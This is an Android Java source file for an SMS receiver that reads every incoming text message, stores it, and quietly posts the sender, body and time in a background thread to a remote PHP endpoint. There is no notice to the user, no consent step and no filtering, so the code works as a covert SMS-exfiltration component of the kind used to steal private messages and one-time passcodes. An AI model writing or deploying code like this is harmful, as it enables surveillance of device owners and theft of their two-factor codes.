package com.example.smsread;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.content.SharedPreferences;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class SmsReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        if (bundle == null) return;

        Object[] pdus = (Object[]) bundle.get("pdus");
        if (pdus == null) return;

        StringBuilder fullMessage = new StringBuilder();
        String sender = null;
        long timeMillis = 0;

        for (Object pdu : pdus) {
            SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
            if (sender == null) {
                sender = sms.getDisplayOriginatingAddress();
                timeMillis = sms.getTimestampMillis();
            }
            fullMessage.append(sms.getMessageBody());
        }

        String timeStr = new SimpleDateFormat("dd MMM yyyy, hh:mm a", Locale.getDefault())
                .format(new Date(timeMillis));

        String finalMsg = "Sender: " + sender + "\nTime: " + timeStr + "\nMessage:\n" + fullMessage;

        // Save locally in SharedPreferences
        SharedPreferences sp = context.getSharedPreferences("SMS_STORE", Context.MODE_PRIVATE);
        sp.edit().putString("latest_sms", finalMsg).apply();

        // Send SMS data to server
        sendToServer(sender, fullMessage.toString(), timeStr);
    }

    private void sendToServer(String sender, String message, String time) {
        new Thread(() -> {
            try {
                URL url = new URL("https://laraabook.com/My_Sever_Apps/send_sms.php"); // Replace with actual server URL
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

                String data = "sender=" + URLEncoder.encode(sender, "UTF-8") +
                        "&message=" + URLEncoder.encode(message, "UTF-8") +
                        "&time=" + URLEncoder.encode(time, "UTF-8");

                OutputStream os = conn.getOutputStream();
                os.write(data.getBytes());
                os.flush();
                os.close();

                int responseCode = conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }
}
